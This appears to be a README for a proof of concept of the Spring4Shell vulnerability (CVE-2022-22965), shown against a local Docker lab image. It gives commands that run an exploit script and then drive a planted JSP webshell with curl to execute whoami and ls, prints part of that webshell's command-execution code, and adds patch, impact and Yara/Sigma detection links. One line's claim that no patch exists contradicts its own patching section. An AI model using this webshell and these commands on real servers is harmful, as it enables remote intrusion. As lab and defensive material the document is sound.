# Spring Core RCE - CVE-2022-22965

> After Spring Cloud, on March 29, another heavyweight vulnerability of Spring broke out on the Internet: Spring Core RCE 
>
> On March 31 Spring released new versions which fixes the vulnerability. See section [Patching](#patching).
> 
> On March 31 a [CVE-number was finally assigned to the vulnerability](https://tanzu.vmware.com/security/cve-2022-22965) with a [CVSS score 9.8 (CRITICAL)](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

## Proof-of-Concept
The exploit is very easy to use, hence the very high CVSS score of 9.8.

To test the vulnerability you can do the following.

Start a vulnerable docker image of Spring.
```sh
docker run -d -p 8082:8080 --name springrce -it vulfocus/spring-core-rce-2022-03-29
```

This binds the vulnerable Spring to the address `localhost:8082`.

Verify the image is started correctly with `curl`
```sh
curl http://localhost:8082
```

A response of `ok` should be returned.

Let's exploit the vulnerable image now!

```sh
python3 exp.py --url http://localhost:8082
```

A response of `The vulnerability exists ....` should be returned.

You can now exploit the vulnerability with `curl`
```sh
# Execute command whoami
curl --output - http://localhost:8082/tomcatwar.jsp?pwd=j&cmd=whoami

# Response has been truncated
root

//
- if("j".equals(request.getParameter("pwd"))){ java.io.InputStream in = -.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } - ........

# Execute command ls
curl --output - http://localhost:8082/tomcatwar.jsp?pwd=j&cmd=ls

# Response has been truncated
app
bin
dev
etc
..........
```

## Circulating coding poc 
**The exploit has been uploaded so far ```exp.py```**  
![Circulating coding poc ](images/poc.png)  
![awkward situation ](images/img_1.png)

## Patching
Spring have now released new versions which addresses this CVE. See [Springs announcement](https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement).
[Patch Links in Spring Production ](https://github.com/spring-projects/spring-framework/commit/7f7fb58dd0dae86d22268a4b59ac7c72a6c22529)

## Vulnerability Impact 
1. JDK version 9 and above 
2. Spring Framework or derived frameworks are used

## Bug fix suggestion 
At present, Spring has not officially released a patch, it is recommended to reduce the jdk version as a temporary solution

## Blue team
### Yara
* [Florian Roth - Spring4Shell webshells](https://github.com/Neo23x0/signature-base/blob/master/yara/expl_spring4shell.yar)

### Sigma
* [Emanuele De Lucia - Creation of .jsp webshells](https://github.com/edelucia/rules/blob/main/sigma/Spring4Shell.yaml)
